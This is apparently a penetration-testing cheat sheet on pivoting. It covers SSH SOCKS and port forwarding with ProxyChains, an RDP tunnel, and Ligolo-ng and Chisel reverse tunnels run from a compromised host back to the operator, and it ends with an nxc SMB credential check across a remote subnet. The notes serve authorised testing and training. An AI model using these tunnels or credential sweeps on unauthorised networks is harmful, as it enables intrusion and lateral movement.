Pivot​

Dynamic Port Forwarding with ProxyChains​

Open tunnel:

ssh -f -D 1080 'sherlock'@<compromised_machine> -N

If the tool doesn't have proxy support, you can use proxychains. ProxyChains only handle TCP, so no SYN scans, no UDP scans, no ping alive checks.

Add SOCKS in /etc/proxychains.conf:

socks4 127.0.0.1 1080

ProxyChain HTTP access test:

proxychains -q curl -I http://<target>

Single Port Forwarding​

# open
ssh -L 8080:<out_of_reach_host>:80 user@ip> -N

# test
curl -I http://localhost:8080

RDP Example​

# RDP example
ssh -L 13389:<target>:3389 <user>@<relay_ip> -N

xfreerdp /v:127.0.0.1:13389 /u:<user> /p:'<pass>' /cert:ignore

Ligolo-ng​

Virtual TUN network interface on localhost. Support's ICMP. Good for complex engagements.

# server, local
sudo ./proxy -selfcert

# compromised target
./agent -connect <localhost>:11601 -accept-fingerprint <fingerprint>

# server, local
sudo ip route add <remote_network>/24 dev ligolo

# test
nxc smb <remote_network>/24 -u <user> -p '<pass>'

Chisel​

Creates a reverse SOCKS tunnel over HTTP.

# server, local
chisel server --port 8080 --reverse

# compromised target
chisel.exe client <localhost>:8080 R:1080:socks
